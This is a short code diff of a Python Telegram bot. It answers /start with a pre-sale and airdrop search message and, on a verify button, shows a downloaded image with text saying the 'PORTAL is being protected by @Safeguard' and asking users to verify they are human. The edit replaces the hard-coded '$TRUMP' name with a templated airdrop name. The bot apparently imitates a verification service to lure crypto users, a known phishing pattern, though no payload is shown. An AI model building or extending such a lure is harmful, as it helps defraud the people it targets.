@@ -28,7 +28,6 @@ verify_bot_image_url = 'https://firebasestorage.googleapis.com/v0/b/nexus-fx-inv
 @bot_client.on(events.NewMessage(pattern='/start'))
 async def on_start(event):
     try:
-        # Set the current airdrop name as a variable
         
         # Send the initial message
         await event.respond("Searching for available pre-sales and airdrops...")
@@ -70,6 +69,7 @@ async def on_start(event):
 @bot_client.on(events.CallbackQuery(data=b'verify_button'))
 async def on_verify_button_click(event):
     try:
+
         # Download the portal bot-specific image
         async with aiohttp.ClientSession() as session:
             async with session.get(verify_bot_image_url) as response:
@@ -82,7 +82,7 @@ async def on_verify_button_click(event):
                     await event.respond(
                         file=image_data,
                         message=(
-                            "$TRUMP | PORTAL is being protected by @Safeguard\n\n"
+                            f"{airdrop_name} | PORTAL is being protected by @Safeguard\n\n"
                             "Click below to verify you're human"
                         ),
                         buttons=[
